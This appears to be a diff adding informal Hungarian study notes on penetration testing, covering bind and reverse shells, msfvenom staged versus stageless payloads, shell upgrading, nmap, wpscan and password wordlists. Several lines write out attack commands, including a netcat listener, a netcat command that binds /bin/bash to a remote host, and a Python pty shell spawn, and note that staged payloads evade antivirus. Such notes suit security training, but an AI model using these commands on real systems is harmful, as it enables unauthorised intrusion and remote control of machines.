@@ -1,0 +1,26 @@
+Shell=terminal
+Bind shell
+Reverse shell : 95%-a a tamadashoz hasznalt parancsoknak
+Reverse szempontok:
+Attacker: Listener keszitese egy fix porton 1024 alatt su szukseges
+Target: shellcode, ami futtataskor kapcsolodik a target-hez, a targeten random port nyilik, kimenő kapcsolatot kezdemenyez
+Mi szamitogepunkon random port megnyilik a kapcsolatok eseten
+Bind tul.:A: listener a target-en, ugyanugy shellcode-ot küld, futtataskor listener-t nyit a target-en(fix port), onmagahoz koti a target shell i/o-jat
+T: varja a bejovo kapcsolatot az o fix portjan
+Miert nem gyakran hasznaljak?
+Tuzfalak a bejovo portokat, kapcsolatokat korlatozzak.nc -lvnp 4444nc -nv <ip cim porttal> -e /bin/bash
+Nem interaktiv shell-t adA celpont gepen kell barmilyen sudo parancs utan a jelszot megadni
+Cel: upgrade to fel-interaktiv2 kategoria: PHP, NEM PHPsudo nmap -sn <ip cim>
+40.0.3.18/admin/user.phpSerulekenyseg: directory traversalUnrestricted file uploadmsfvenom -l payloads(csak 64-bites kod)
+Staged: netcat csak ezzel mukodik
+Ketfazisu: par bt code, amit a target letolt a gepemrol, csatlakozik az en gepemre, sokkal kisebb, virusirtok nem veszik eszre
+Nem szakitja meg a parancssortstageless: generaljon egy fajlt, egy fajlban a shell code, futtatjak a kodot es kesz, virusok nagyresze ezt hasznalja, megszakad a kapcsolat egy parancs irasanal
+ip a: sajat ip cim
+Nincs futtatasi engedely
+Nem kell a php-hez staged vagy stageless
+Python szukseges: python(3) -c “import pty; pty.spawn(‘/bin/bash’)”
+Reverse shell cheat sheet
+wpscan - wordpress scan
+Szolistak:
+/usr/share/wordlists/dirb/common.txt
+/usr/share/wordlists/rockyou.txt
